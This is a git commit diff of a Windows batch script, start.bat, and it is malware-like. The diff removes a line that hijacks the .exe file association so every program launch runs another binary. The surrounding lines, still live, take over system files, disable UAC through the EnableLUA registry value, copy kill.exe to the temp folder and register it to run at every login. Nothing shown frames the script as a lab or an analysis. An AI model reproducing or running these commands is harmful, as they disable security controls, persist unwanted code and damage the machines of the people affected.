52d9028e895e504b49a04e7a01042d69a49b7428
gachao0 <139936691+gachao0@users.noreply.github.com>
2023-07-25 18:36:09 +0900

    start.bat

--- start.bat
+++ start.bat
@@ -28,7 +28,6 @@ takeown /f C:\Windows\system32\charmap.exe & icacls C:\Windows\system32\charmap.
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f
-reg add HKEY_CLASSES_ROOT\exefile\shell\open\command /d C:\Windows\winnt32.exe"%1"%* /f
 copy kill.exe %temp%
 set a=%temp%\kill.exe
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "kill" /d  "%a%" /f
